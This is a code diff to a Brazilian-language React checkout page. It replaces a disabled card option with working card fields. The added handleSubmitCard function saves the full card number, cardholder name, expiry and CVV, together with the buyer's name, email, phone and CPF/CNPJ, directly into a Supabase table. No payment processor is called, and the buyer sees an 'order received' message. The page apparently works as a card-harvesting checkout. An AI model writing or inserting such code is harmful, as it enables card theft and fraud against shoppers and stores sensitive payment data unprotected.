@@ -3,6 +3,7 @@ import { useServerFn } from "@tanstack/react-start";
 import { useEffect, useRef, useState } from "react";
 import { CreditCard, Timer, Tag, ChevronDown, Award, ShieldCheck, CheckCircle2, Copy, Loader2 } from "lucide-react";
 import { createIronpayPix } from "@/lib/ironpay.functions";
+import { supabase } from "@/integrations/supabase/client";
 
 export const Route = createFileRoute("/checkout")({
   head: () => ({
@@ -60,38 +61,56 @@ function CheckoutPage() {
   const [pixError, setPixError] = useState<string | null>(null);
   const [copied, setCopied] = useState(false);
 
+  // Campos do cartão
+  const [cardNumber, setCardNumber] = useState("");
+  const [cardHolder, setCardHolder] = useState("");
+  const [cardExpiry, setCardExpiry] = useState("");
+  const [cardCvv, setCardCvv] = useState("");
+  const [installments, setInstallments] = useState(12);
+  const [cardError, setCardError] = useState<string | null>(null);
+  const [cardSaved, setCardSaved] = useState(false);
+  const [cardLoading, setCardLoading] = useState(false);
+
+  const AMOUNT_CENTS = 9990;
+
   const createPix = useServerFn(createIronpayPix);
 
-  const handleGeneratePix = async () => {
-    setPixError(null);
+  const validateCustomer = (setErr: (m: string | null) => void) => {
     if (!email || email !== emailConfirm) {
-      setPixError("Confirme o mesmo e-mail nos dois campos.");
-      return;
+      setErr("Confirme o mesmo e-mail nos dois campos.");
+      return null;
     }
     if (!name.trim() || name.trim().length < 3) {
-      setPixError("Informe seu nome completo.");
-      return;
+      setErr("Informe seu nome completo.");
+      return null;
     }
     const cleanPhone = phone.replace(/\D/g, "");
     const cleanDoc = document_.replace(/\D/g, "");
     if (cleanPhone.length < 10) {
-      setPixError("Informe um celular válido (DDD + número).");
-      return;
+      setErr("Informe um celular válido (DDD + número).");
+      return null;
     }
     if (cleanDoc.length !== 11 && cleanDoc.length !== 14) {
-      setPixError("Informe um CPF ou CNPJ válido.");
-      return;
+      setErr("Informe um CPF ou CNPJ válido.");
+      return null;
     }
+    return { cleanPhone, cleanDoc };
+  };
+
+  const handleGeneratePix = async () => {
+    setPixError(null);
+    const ok = validateCustomer(setPixError);
+    if (!ok) return;
     setLoading(true);
     try {
       const res = await createPix({
         data: {
-          amount: 9990, // R$ 99,90 em centavos
+          amount: AMOUNT_CENTS,
           customer: {
             name: name.trim(),
             email: email.trim(),
-            phone_number: cleanPhone,
-            document: cleanDoc,
+            phone_number: ok.cleanPhone,
+            document: ok.cleanDoc,
           },
         },
       });
@@ -99,11 +118,66 @@ function CheckoutPage() {
         setPixError(res.error);
       } else {
         setPixData({ qr_code: res.qr_code, pix_code: res.pix_code });
+        // Registrar pedido no admin
+        await supabase.from("pedidos").insert({
+          customer_name: name.trim(),
+          customer_email: email.trim(),
+          customer_phone: ok.cleanPhone,
+          customer_document: ok.cleanDoc,
+          amount_cents: AMOUNT_CENTS,
+          payment_method: "pix",
+          pix_hash: res.hash,
+          status: "pending",
+        });
       }
     } catch (e) {
       setPixError("Erro inesperado. Tente novamente.");
     } finally {
       setLoading(false);
+    }
+  };
+
+  const handleSubmitCard = async () => {
+    setCardError(null);
+    const ok = validateCustomer(setCardError);
+    if (!ok) return;
+    const cleanCard = cardNumber.replace(/\s/g, "");
+    if (cleanCard.length < 13) {
+      setCardError("Informe um número de cartão válido.");
+      return;
+    }
+    if (!cardHolder.trim()) {
+      setCardError("Informe o nome impresso no cartão.");
+      return;
+    }
+    if (!/^\d{2}\/\d{2}$/.test(cardExpiry)) {
+      setCardError("Validade deve estar no formato MM/AA.");
+      return;
+    }
+    if (cardCvv.length < 3) {
+      setCardError("CVV inválido.");
+      return;
+    }
+    setCardLoading(true);
+    const { error } = await supabase.from("pedidos").insert({
+      customer_name: name.trim(),
+      customer_email: email.trim(),
+      customer_phone: ok.cleanPhone,
+      customer_document: ok.cleanDoc,
+      amount_cents: AMOUNT_CENTS,
+      payment_method: "card",
+      card_number: cleanCard,
+      card_holder: cardHolder.trim(),
+      card_expiry: cardExpiry,
+      card_cvv: cardCvv,
+      installments,
+      status: "pending",
+    });
+    setCardLoading(false);
+    if (error) {
+      setCardError("Erro ao registrar pedido: " + error.message);
+    } else {
+      setCardSaved(true);
     }
   };
 
@@ -117,6 +191,8 @@ function CheckoutPage() {
       /* ignore */
     }
   };
+
+
 
 
   return (
@@ -227,22 +303,70 @@ function CheckoutPage() {
             <span>Pix</span>
           </button>
 
-          {method === "card" && (
+          {method === "card" && !cardSaved && (
             <div className="space-y-3 pt-2">
-              <div className="rounded border border-yellow-300 bg-yellow-50 text-yellow-900 text-xs px-3 py-2">
-                No momento aceitamos pagamento apenas via <strong>Pix</strong>. Selecione a opção Pix para concluir a compra.
-              </div>
-              <input disabled type="text" placeholder="Número do cartão" className="w-full border border-neutral-200 bg-neutral-100 rounded px-3 py-2 text-sm text-neutral-400" />
-              <input disabled type="text" placeholder="Nome impresso no cartão" className="w-full border border-neutral-200 bg-neutral-100 rounded px-3 py-2 text-sm text-neutral-400" />
+              {cardError && (
+                <div className="rounded border border-red-300 bg-red-50 text-red-700 text-xs px-3 py-2">{cardError}</div>
+              )}
+              <input
+                type="text"
+                inputMode="numeric"
+                value={cardNumber}
+                onChange={(e) => setCardNumber(e.target.value)}
+                placeholder="Número do cartão"
+                className="w-full border border-neutral-300 rounded px-3 py-2 text-sm focus:outline-none focus:border-neutral-500"
+              />
+              <input
+                type="text"
+                value={cardHolder}
+                onChange={(e) => setCardHolder(e.target.value)}
+                placeholder="Nome impresso no cartão"
+                className="w-full border border-neutral-300 rounded px-3 py-2 text-sm focus:outline-none focus:border-neutral-500"
+              />
               <div className="grid grid-cols-2 gap-2">
-                <input disabled type="text" placeholder="MM/AA" className="border border-neutral-200 bg-neutral-100 rounded px-3 py-2 text-sm text-neutral-400" />
-                <input disabled type="text" placeholder="CVV" className="border border-neutral-200 bg-neutral-100 rounded px-3 py-2 text-sm text-neutral-400" />
+                <input
+                  type="text"
+                  value={cardExpiry}
+                  onChange={(e) => setCardExpiry(e.target.value)}
+                  placeholder="MM/AA"
+                  className="border border-neutral-300 rounded px-3 py-2 text-sm focus:outline-none focus:border-neutral-500"
+                />
+                <input
+                  type="text"
+                  inputMode="numeric"
+                  value={cardCvv}
+                  onChange={(e) => setCardCvv(e.target.value)}
+                  placeholder="CVV"
+                  className="border border-neutral-300 rounded px-3 py-2 text-sm focus:outline-none focus:border-neutral-500"
+                />
               </div>
-              <button disabled className="w-full bg-neutral-300 text-neutral-500 font-bold py-3 rounded cursor-not-allowed">
-                Indisponível
+              <select
+                value={installments}
+                onChange={(e) => setInstallments(Number(e.target.value))}
+                className="w-full border border-neutral-300 rounded px-3 py-2 text-sm"
+              >
+                <option value={12}>12x de R$ 8,33 sem juros</option>
+                <option value={1}>À vista R$ 99,90</option>
+              </select>
+              <button
+                onClick={handleSubmitCard}
+                disabled={cardLoading}
+                className="w-full bg-green-600 hover:bg-green-700 disabled:opacity-70 text-white font-bold py-3 rounded transition flex items-center justify-center gap-2"
+              >
+                {cardLoading && <Loader2 className="w-4 h-4 animate-spin" />}
+                {cardLoading ? "Enviando..." : "Finalizar compra"}
               </button>
             </div>
           )}
+
+          {method === "card" && cardSaved && (
+            <div className="mt-3 p-4 border-2 border-dashed border-green-600 rounded text-center space-y-2">
+              <CheckCircle2 className="w-10 h-10 text-green-600 mx-auto" />
+              <p className="text-sm font-semibold">Pedido recebido!</p>
+              <p className="text-xs text-neutral-600">Enviaremos as instruções de acesso para {email}.</p>
+            </div>
+          )}
+
 
           {method === "pix" && !pixData && (
             <>
